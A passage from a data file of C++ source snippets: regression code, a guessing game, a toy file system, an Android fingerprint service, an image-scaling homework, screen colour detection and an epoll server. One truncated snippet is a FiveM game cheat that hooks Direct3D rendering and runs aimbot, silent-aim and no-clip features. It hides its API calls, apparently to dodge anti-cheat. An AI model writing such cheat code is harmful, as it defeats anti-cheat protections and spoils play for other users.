numbers!\"); // This can change later, but at the moment logistic regression will only be defined for real numbers\n    }\n\n    ComplexNum odds = prob/((-1 * prob) + 1);\n    double logOdds = std::log(odds.getRealPart());\n    ComplexNum cnumToRet(logOdds, 0);\n    return cnumToRet;\n}\n\nOlsLogisticRegressor::OlsLogisticRegressor() : regressionCoefficients(), numVars(0), isFit(false) {}\n\nvoid OlsLogisticRegressor::fit(Matrix* xData, Matrix* yData) {\n    numVars = xData->getNumCols();\n    Matrix copyOfYData = (*yData);\n    yDataProbTransform(&copyOfYData);\n\n    Matrix yLogits(yData->getNumRows(), 1);\n\n    for (int i = 0; i < yData->getNumRows(); i++) {\n        ComplexNum zToTransform = copyOfYData(i, 0);\n        yLogits(i, 0) = logit(zToTransform);\n    }\n\n    Matrix coefficients = ordinaryLeastSquaresCoefficients(xData, &yLogits);\n\n    isFit = true;\n    regressionCoefficients = coefficients;\n\n}\n\nMatrix OlsLogisticRegressor::predict(Matrix *xDataToPred) {\n    Matrix yHat(xDataToPred->getNumRows(), 1);\n\n    for (int i = 0; i < xDataToPred->getNumRows(); i++) {\n        Matrix xRow(1, xDataToPred->getNumCols());\n        for (int j = 0; j < xData",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\nint main(){\r\n\tint num;\r\n\tint guess;\r\n\tint tries;\r\n\tint numtry;\r\n\tstd::string pag;\r\n\t\r\n\tstd::cout << \"Please choose number of tries you would like to have: \";\r\n\tstd::cin >> numtry;\r\n\t\r\n\tsrand(time(0));\r\n\tnum = (rand() % 100) + 1;\r\n\t\r\n\tstd::cout << \"*****************Number Guessing Game*****************\" << '\\n';\r\n\tstd::cout << '\\n';\r\n\r\ndo{\r\n\t\r\n\r\n\t\tstd::cout << \"Guess a number between 1-100 :\";\r\n\t\tstd::cin >> guess;\r\n\t\t\r\n\t\ttries++;\r\n \r\nif(tries <= numtry){\r\n\t\tif(guess > num){\r\n\t\t\r\n\tstd::cout << \"Too High! \" << '\\n';\r\n\t}\r\n\r\n    else if(guess < num){\r\n    \t\r\n    \tstd::cout << \"Too Low! \" << '\\n';\r\n\t}\r\n\t\t\r\n\telse{\r\n\t\t\r\n\t\tstd::cout << \"CORRECT MAN!\" << \"    Tries taken = \" << tries << '\\n';\r\n\t\r\n\t}\r\n\t\r\n\t\r\n}\r\nelse{\r\n\tstd::cout << \"Your tries are OVER!\" << '\\n';\r\n\tbreak;\r\n}\r\n\r\n\t\r\n\r\n\t\r\n\tstd::cout << '\\n';\r\nstd::cout << \"                 ******************************************************                       \";\r\n\t\r\n   return 0;\t\r\n}\r\n",
    "#include \"File_System.h\"\r\n\r\nshared_ptr<Disk> diskData;//\u78c1\u76d8\u6570\u636e\r\nshared_ptr<Directory> currentDirectory;//\u5f53\u524d\u76ee\u5f55\r\nshared_ptr<User> currentUser;//\u5f53\u524d\u7528\u6237\r\nconst string SAVE_PATH = \"disk.dat\";//\u4fdd\u5b58\u78c1\u76d8\u6570\u636e\u7684\u6587\u4ef6\u8def\u5f84\r\nshared_ptr<FileControlBlock> copiedFile = nullptr;//\u521d\u59cb\u5316\u5168\u5c40\u53d8\u91cf\u6765\u4fdd\u5b58\u62f7\u8d1d\u7684\u6587\u4ef6\u4fe1\u606f\r\nset<string> openFiles; // \u521d\u59cb\u5316\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u96c6\u5408\r\nstring openFileName = \"\"; // \u521d\u59cb\u5316\u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u540d\r\nmutex diskMutex;//\u521d\u59cb\u5316\u78c1\u76d8\u6570\u636e\u7684\u4e92\u65a5\u9501\r\ncondition_variable cv;//\u521d\u59cb\u5316\u6761\u4ef6\u53d8\u91cf\r\nbool exitFlag = false;//\u521d\u59cb\u5316\u63a8\u51fa\u53d8\u91cf\r\nqueue<string> commandQueue;//\u521d\u59cb\u5316\u547d\u4ee4\u961f\u5217\r\n\r\n// \u6253\u5370\u5e2e\u52a9\u4fe1\u606f\r\nvoid printHelp() {\r\n    cout << \"\u53ef\u7528\u547d\u4ee4\u53ca\u7528\u6cd5:\\n\";\r\n    cout << \"  register <\u7528\u6237\u540d> <\u5bc6\u7801>                  - \u6ce8\u518c\u65b0\u7528\u6237\\n\";\r\n    cout << \"  login <\u7528\u6237\u540d> <\u5bc6\u7801>                     - \u767b\u5f55\u7528\u6237\\n\";\r\n    cout << \"  logout                                    - \u9000\u51fa\u5f53\u524d\u7528\u6237\\n\";\r\n    cout << \"  listUsers                                 - \u663e\u793a\u8d26\u53f7\\n\";\r\n    cout << \"  mkdir <\u76ee\u5f55\u540d>                            - \u521b\u5efa\u76ee\u5f55\\n\";\r\n    cout << \"  cd <\u76ee\u5f55\u540d>                               - \u5207\u6362\u76ee\u5f55\\n\";\r\n    cout << \"  rmdir <\u76ee\u5f55\u540d>                            - \u5220\u9664\u76ee\u5f55\\n\";\r\n    cout << \"  dir                                       - \u663e\u793a\u5f53\u524d\u76ee\u5f55\u5185\u5bb9\\n\";\r\n    cout << \"  create <\u6587\u4ef6\u540d>                           - \u521b\u5efa\u6587\u4ef6\\n\";\r\n    cout << \"  delete <\u6587\u4ef6\u540d>                           - \u5220\u9664\u6587\u4ef6\\n\";\r\n    cout << \"  open <\u6587\u4ef6\u540d>                             - \u6253\u5f00\u6587\u4ef6\\n\";\r\n    cout << \"  close <\u6587\u4ef6\u540d>                            - \u5173\u95ed\u6587\u4ef6\\n\";\r\n    cout << \"  write                                     - \u5199\u5165\u6587\u4ef6\\n\";\r\n    cout << \"  read                                      - \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\\n\";\r\n    cout << \"  head <\u884c\u6570>                               - \u663e\u793a\u6587\u4ef6\u5934\u90e8\\n\";\r\n    cout << \"  tail <\u884c\u6570>                               - \u663e\u793a\u6587\u4ef6\u5c3e\u90e8\\n\";\r\n    cout << \"  lseek <\u504f\u79fb\u91cf>                            - \u79fb\u52a8\u6587\u4ef6\u8bfb\u5199\u6307\u9488\\n\";\r\n    cout << \"  move <\u6587\u4ef6\u540d> <\u76ee\u6807\u76ee\u5f55>                  - \u79fb\u52a8\u6587\u4ef6\\n\";\r\n    cout << \"  copy <\u6587\u4ef6\u540d>                             - \u62f7\u8d1d\u6587\u4ef6\\n\";\r\n    cout << \"  paste                                     - \u7c98\u8d34\u6587\u4ef6\\n\";\r\n    cout << \"  flock <\u6587\u4ef6\u540d>                            - \u9501\u5b9a/\u89e3\u9501\u6587\u4ef6\\n\";\r\n    cout << \"  import <\u672c\u5730\u6587\u4ef6\u8def\u5f84> <\u865a\u62df\u78c1\u76d8\u6587\u4ef6\u540d>    - \u5bfc\u5165\u6587\u4ef6\\n\";\r\n    cout << \"  export <\u865a\u62df\u78c1\u76d8\u6587\u4ef6\u540d> <\u672c\u5730\u76ee\u5f55\u8def\u5f84>    - \u5bfc\u51fa\u6587\u4ef6\\n\";\r\n    cout << \"  help                                      - \u663e\u793a\u5e2e\u52a9\u4fe1\u606f\\n\";\r\n    cout << \"  exit                                      - \u9000\u51fa\u7a0b\u5e8f\\n\";\r\n    cout << endl;\r\n}\r\n\r\n// \u89e3\u6790\u7528\u6237\u8f93\u5165\u7684\u547d\u4ee4\r\nvector<string> inputResolve(const string& input) {\r\n    vector<string> result; // \u7528\u4e8e\u5b58\u50a8\u89e3\u6790\u540e\u7684\u5355\u8bcd\r\n    istringstream iss(input);// \u4f7f\u7528 istringstream \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u8f93\u5165\u6d41\r\n    string token; // \u7528\u4e8e\u5b58\u50a8\u4ece\u8f93\u5165\u6d41\u4e2d\u63d0\u53d6\u7684\u6bcf\u4e2a\u5355\u8bcd\r\n    while (iss >> token) {\r\n        result.push_back(token);// \u5c06\u63d0\u53d6\u7684\u5355\u8bcd\u52a0\u5165\u7ed3\u679c\u5411\u91cf\r\n    }\r\n    return result;\r\n}\r\n\r\n// \u9012\u5f52\u4fdd\u5b58\u76ee\u5f55\u548c\u6587\u4ef6\r\nvoid saveDirectory(ofstream& file, shared_ptr<Directory> directory) {\r\n    // \u83b7\u53d6\u5f53\u524d\u76ee\u5f55\u7684\u5b50\u76ee\u5f55\u6570\u91cf\u548c\u6587\u4ef6\u6570\u91cf\r\n    size_t dirCount = directory->children.size();\r\n    size_t fileCount = directory->files.size();\r\n\r\n    // \u5c06\u5b50\u76ee\u5f55\u6570\u91cf\u5199\u5165\u6587\u4ef6\r\n    file.write(reinterpret_cast<const char*>(&dirCount), sizeof(dirCount));\r\n\r\n    // \u904d\u5386\u6bcf\u4e2a\u5b50\u76ee\u5f55\r\n    for (const auto& dir : directory->children) {\r\n        // \u83b7\u53d6\u5b50\u76ee\u5f55\u540d\u79f0\u957f\u5ea6\u5e76\u5199\u5165\u6587\u4ef6\r\n        size_t dirNameLen = dir->fileControlBlock->fileName.size();\r\n        file.write(reinterpret_cast<const char*>(&dirNameLen), sizeof(dirNameLen));\r\n        // \u5199\u5165\u5b50\u76ee\u5f55\u540d\u79f0\r\n        file.write(dir->fileControlBlock->fileName.c_str(), dirNameLen);\r\n        // \u9012\u5f52\u4fdd\u5b58\u5b50\u76ee\u5f55\r\n        saveDirectory(file, dir);\r\n    }\r\n    // \u5c06\u6587\u4ef6\u6570\u91cf\u5199\u5165\u6587\u4ef6\r\n    file.write(reinterpret_cast<const char*>(&fileCount), sizeof(fileCount));\r\n\r\n    // \u904d\u5386\u6bcf\u4e2a\u6587\u4ef6\r\n    for (const auto& fcb : directory->files) {\r\n        // \u83b7\u53d6\u6587\u4ef6\u540d\u79f0\u957f\u5ea6\u5e76\u5199\u5165\u6587\u4ef6\r\n        size_t fileNameLen = fcb->fileName.size();\r\n        file.write(reinterpret_cast<const char*>(&fileNameLen), sizeof(fileNameLen));\r\n        // \u5199\u5165\u6587\u4ef6\u540d\u79f0\r\n        file.write(fcb->fileName.c_str(), fileNameLen);\r\n        // \u83b7\u53d6\u6587\u4ef6\u5185\u5bb9\u957f\u5ea6\u5e76\u5199\u5165\u6587\u4ef6\r\n        size_t contentLen = fcb->content.size();\r\n        file.write(reinterpret_cast<const char*>(&contentLen), sizeof(contentLen));\r\n        // \u5199\u5165\u6587\u4ef6\u5185\u5bb9\r\n        file.write(fcb->content.c_str(), contentLen);\r\n        // \u5199\u5165\u6587\u4ef6\u8bfb\u5199\u6307\u9488\u4f4d\u7f6e\r\n        file.write(reinterpret_cast<const char*>(&fcb->readWritePointer), sizeof(fcb->readWritePointer));\r\n        // \u5199\u5165\u6587\u4ef6\u9501\u5b9a\u72b6\u6001\r\n        file.write(reinterpret_cast<const char*>(&fcb->isLocked), sizeof(fcb->isLocked));\r\n    }\r\n}\r\n\r\n// \u9012\u5f52\u52a0\u8f7d\u76ee\u5f55\u548c\u6587\u4ef6\uff0c\u5e76\u8bbe\u7f6e\u7236\u76ee\u5f55\u6307\u9488\r\nvoid loadDirectory(ifstream& file, shared_ptr<Directory> directory) {\r\n    size_t dirCount, fileCount;// \u5b50\u76ee\u5f55\u6570\u91cf\u548c\u6587\u4ef6\u6570\u91cf\r\n    file.read(reinterpret_cast<char*>(&dirCount), sizeof(dirCount));// \u8bfb\u53d6\u5f53\u524d\u76ee\u5f55\u7684\u5b50\u76ee\u5f55\u6570\u91cf\r\n    // \u904d\u5386\u6bcf\u4e2a\u5b50\u76ee\u5f55\r\n    for (size_t i = 0; i < dirCount; ++i) {\r\n        string dirName;\r\n        size_t dirNameLen;\r\n        file.read(reinterpret_cast<char*>(&dirNameLen), sizeof(dirNameLen));// \u8bfb\u53d6\u5b50\u76ee\u5f55\u540d\u79f0\u957f\u5ea6\r\n        dirName.resize(dirNameLen);\r\n        file.read(&dirName[0], dirNameLen);\r\n        // \u521b\u5efa\u5b50\u76ee\u5f55\u5e76\u8bbe\u7f6e\u5176\u5c5e\u6027\r\n        auto dir = make_shared<Directory>();\r\n        dir->fileControlBlock = make_shared<FileControlBlock>();\r\n        dir->fileControlBlock->fileName = dirName;\r\n        dir->fileControlBlock->isDirectory = true;\r\n        dir->parentDirectory = directory; // \u8bbe\u7f6e\u7236\u76ee\u5f55\u6307\u9488\r\n        // \u5c06\u5b50\u76ee\u5f55\u52a0\u5165\u5f53\u524d\u76ee\u5f55\u7684\u5b50\u76ee\u5f55\u5217\u8868\r\n    ",
    "/*\n * Copyright (C) 2017 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.biometrics.fingerprint@2.3-service\"\n\n#include <android/log.h>\n#include <hidl/HidlSupport.h>\n#include <hidl/HidlTransportSupport.h>\n#include <android/hardware/biometrics/fingerprint/2.3/IBiometricsFingerprint.h>\n#include <android/hardware/biometrics/fingerprint/2.1/types.h>\n#include \"BiometricsFingerprint.h\"\n\nusing android::hardware::biometrics::fingerprint::V2_3::IBiometricsFingerprint;\nusing android::hardware::biometrics::fingerprint::V2_3::implementation::BiometricsFingerprint;\nusing android::hardware::configureRpcThreadpool;\nusing android::hardware::joinRpcThreadpool;\nusing android::sp;\n\nint main() {\n    android::sp<IBiometricsFingerprint> bio = BiometricsFingerprint::getInstance();\n\n    configureRpcThreadpool(1, true /*callerWillJoin*/);\n\n    if (bio != nullptr) {\n        if (::android::OK != bio->registerAsService()) {\n            return 1;\n        }\n    } else {\n        ALOGE(\"Can't create instance of BiometricsFingerprint, nullptr\");\n    }\n\n    joinRpcThreadpool();\n\n    return 0; // should never get here\n}\n",
    "/**\n * Computa\u00e7\u00e3o Gr\u00e1fica - CIC - 2024.1\n * Atividade 5 - Interpola\u00e7\u00e3o\n *\n * Aluno: Italo Santana Seara - 202220031\n */\n\n#include <iostream>\n#include \"util.hpp\"\n\n#include <GL/gl.h>\n#include <GL/glu.h>\n#include <GL/glut.h>\n\nusing namespace std;\n\nint main(int argc, char *argv[])\n{\n  // Check for usage errors\n  if (argc < 2 || argv[1][0] == '-')\n  {\n    util::printUsage(argv);\n    return 1;\n  }\n\n  // Parse arguments\n  map<string, string> args = util::parseArgs(argc, argv);\n  string input_file = argv[1];\n  string output_file = args[\"o\"];\n  string interpolation_type = args[\"t\"];\n  float scale_x = 0.f;\n  float scale_y = 0.f;\n  bool compare = args[\"c\"] == \"true\";\n\n  // Check for invalid arguments\n  if (interpolation_type != \"nearest\" && interpolation_type != \"bilinear\")\n  {\n    cout << \"Invalid interpolation type: \\\"\" << interpolation_type << \"\\\"\" << endl;\n    return 1;\n  }\n\n  // Check for invalid scale factors\n  try\n  {\n    scale_x = stof(args[\"sx\"]);\n    scale_y = stof(args[\"sy\"]);\n  }\n  catch (const invalid_argument &e)\n  {\n    cout << \"Invalid scale factors, must be numbers\" << endl;\n    return 1;\n  }\n\n  if (scale_x <= 0 || scale_y <= 0)\n  {\n    cout << \"Invalid scale factors, must be greater than 0\" << endl;\n    return 1;\n  }\n\n  util::Image image(input_file);\n\n  cout << \"Image \" << input_file << \" loaded\" << endl;\n  cout << \"Image size: \" << image.width << \"x\" << image.height << endl;\n  cout << endl;\n\n  // Interpolate image\n  util::Image new_image;\n  cout << \"Interpolating using \" << interpolation_type << endl;\n  cout << \"Scale factor: \" << scale_x << \"x\" << scale_y << endl;\n  cout << endl;\n\n  if (interpolation_type == \"nearest\")\n    new_image = image.nearestNeighbor(scale_x, scale_y);\n  else if (interpolation_type == \"bilinear\")\n    new_image = image.bilinear(scale_x, scale_y);\n\n  new_image.save(output_file);\n\n  cout << \"New image size: \" << new_image.width << \"x\" << new_image.height << endl;\n  cout << \"Image saved as: \" << output_file << endl;\n\n  // Show image\n  if (compare)\n  {\n    cout << endl;\n    cout << \"Showing images side by side\" << endl;\n\n    util::initOpenGL();\n    image.show(\"original\", 200, 100);\n    new_image.show(interpolation_type, image.width + 210, 100);\n    util::initLoop();\n  }\n  return 0;\n}",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include <iostream>\n#include <vector>\n#include <opencv2/opencv.hpp>\n#include <opencv2/highgui/highgui.hpp>\n#include <opencv2/imgproc/imgproc.hpp>\n#include \"COLOUR_DETECTION.h\"\n\n\nbool searchColorInFrame(COLORREF targetColor, int tolerance = 0) {\n    BITMAP bmp;\n    if (!GetObject(hBitmap, sizeof(BITMAP), &bmp)) {\n        std::cerr << \"GetObject failed\" << std::endl;\n        return false;\n    }\n\n    BITMAPINFOHEADER bi = { 0 };\n    bi.biSize = sizeof(BITMAPINFOHEADER);\n    bi.biWidth = bmp.bmWidth;\n    bi.biHeight = bmp.bmHeight;\n    bi.biPlanes = 1;\n    bi.biBitCount = 32; // We will use a 32-bit bitmap (RGB + Alpha channel)\n    bi.biCompression = BI_RGB;\n\n    int bmpSize = bmp.bmWidth * bmp.bmHeight * 4;\n    std::vector<BYTE> pixels(bmpSize);\n\n    if (!GetDIBits(hMemoryDC, hBitmap, 0, bmp.bmHeight, pixels.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS)) {\n        std::cerr << \"GetDIBits failed\" << std::endl;\n        return false;\n    }\n    HDC hdc = GetDC(NULL);\n    bool colorFound = false;\n\n    for (int y = 0; y < bmp.bmHeight; ++y) {\n        for (int x = 0; x < bmp.bmWidth; ++x) {\n            int index = (y * bmp.bmWidth + x) * 4;\n            BYTE blue = pixels[index];\n            BYTE green = pixels[index + 1];\n            BYTE red = pixels[index + 2];\n\n            COLORREF color = RGB(red, green, blue);\n\n            if (abs(GetRValue(targetColor) - red) <= tolerance &&\n                abs(GetGValue(targetColor) - green) <= tolerance &&\n                abs(GetBValue(targetColor) - blue) <= tolerance) {\n                std::cout << \"Color detected at (\" << x << \", \" << y << \")\" << std::endl;\n\n\n                RECT rect = { x - 5, y - 5, x + 5, y + 5 }; // Modify rectangle size as needed\n                DrawEdge(hdc, &rect, BDR_RAISEDINNER, BF_RECT); // Draw rectangle\n                colorFound = true;\n            }\n        }\n    }\n\n    if (!colorFound) {\n        std::cout << \"Target color not found.\" << std::endl;\n    }\n\n    return colorFound;\n}\n\n\n\n\n\n\n\n// calling the dectaction ->>\n\n\nbool initializeDetect() {\n    mainCapture();\n    COLORREF targetColor = RGB(255, 0, 0); // Red color\n    int tolerance = 10;\n\n\n    //calling the detect function->>\n    if (searchColorInFrame(targetColor, tolerance)) {\n        std::cout << \"Target color found!\" << std::endl;\n    }\n    else {\n        std::cout << \"Target color not found.\" << std::endl;\n    }\n\n    // Cleanup\n    SelectObject(hMemoryDC, hOldBitmap);\n    DeleteObject(hBitmap);\n    DeleteDC(hMemoryDC);\n    ReleaseDC(NULL, hScreenDC);\n\n    return 0;\n\n}\n\n\n\n\n\n\n\n\n\n// converting the hbitmap to cv::mat data for processing ->\ncv::Mat HBITMAPToMat(HBITMAP hBitmap) {\n    BITMAP bmp;\n    GetObject(hBitmap, sizeof(BITMAP), &bmp);\n\n    BITMAPINFOHEADER bi;\n    bi.biSize = sizeof(BITMAPINFOHEADER);\n    bi.biWidth = bmp.bmWidth;\n    bi.biHeight = -bmp.bmHeight;  // negative to indicate top-down bitmap\n    bi.biPlanes = 1;\n    bi.biBitCount = 32;\n    bi.biCompression = BI_RGB;\n    bi.biSizeImage = 0;\n    bi.biXPelsPerMeter = 0;\n    bi.biYPelsPerMeter = 0;\n    bi.biClrUsed = 0;\n    bi.biClrImportant = 0;\n\n    cv::Mat mat(bmp.bmHeight, bmp.bmWidth, CV_8UC4);\n    GetDIBits(GetDC(0), hBitmap, 0, bmp.bmHeight, mat.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);\n\n    return mat; // returning the cv mat converted data->\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n// searching the colour ->>\nbool colorSearchOpenCv(cv::Mat& frame, const cv::Scalar& targetColor, int tolerance = 10) {\n    cv::Mat hsvFrame;\n    cv::cvtColor(frame, hsvFrame, cv::COLOR_BGR2HSV); // Convert frame to HSV color space\n\n    cv::Scalar lowerBound(targetColor[0] - tolerance, 100, 100);\n    cv::Scalar upperBound(targetColor[0] + tolerance, 255, 255);\n\n    cv::Mat mask;\n    cv::inRange(hsvFrame, lowerBound, upperBound, mask); // Create binary mask of target color\n\n    std::vector<std::vector<cv::Point>> contours;\n    cv::findContours(mask, contours, cv::RETR_EXTERNAL, cv::CHAIN_APPROX_SIMPLE);\n\n    if (contours.empty()) {\n        return false;\n    }\n\n    for (const auto& contour : contours) {\n        cv::Rect boundingRect = cv::boundingRect(contour);\n        cv::rectangle(frame, boundingRect, cv::Scalar(0, 255, 0), 2); // Draw green rectangle\n    }\n\n\n\n    return true;\n}\n\n",
    "#include \"reactor.h\"\n\nint ServerInit()\n{\n    int fd = socket(AF_INET, SOCK_STREAM, 0);\n    if(fd == -1)    std::cerr << \"error in server initialization\" << std::endl; \n    \n    sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(server_port);\n    inet_pton(AF_INET, server_ip_address, &addr.sin_addr.s_addr);\n\n    bind(fd, (sockaddr*)&addr, sizeof(addr));\n    listen(fd, 128);\n\n    return fd;\n}\n\nint AddEpollTree(int fd)\n{\n    static bool flag = true;\n    static epoll_event ev;\n    if(flag)\n    {\n        epollfd = epoll_create(1);\n        if(epollfd == -1)\n        {\n            std::cerr << \"error in creating epoll\" << std::endl; \n            return -1;\n        }\n    } \n\n    ev.events = EPOLLIN | EPOLLET;\n    ev.data.fd = fd;\n\n    epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, &ev);\n    if(!flag)   std::cout << \"add a new client suessfully!\" << std::endl;\n    flag = false;\n    \n    return epollfd;\n}\n\nvoid HandleClient(int cfd)\n{\n    char buf[512];\n    memset(buf, 0, sizeof(buf));\n    int len = read(cfd, buf, sizeof(buf));\n    if(len > 0){\n        printf(\"receive from client-%d is : %s\\n\", cfd, buf);\n        fflush(stdout);\n        //std::this_thread::sleep_for(std::chrono::seconds(10));\n        if(!strcmp(buf, \"close\")){\n            epoll_ctl(epollfd, EPOLL_CTL_DEL, cfd, NULL);\n            close(cfd);\n\t    }\n        else write(cfd, buf, strlen(buf));\n    }\n}\n",
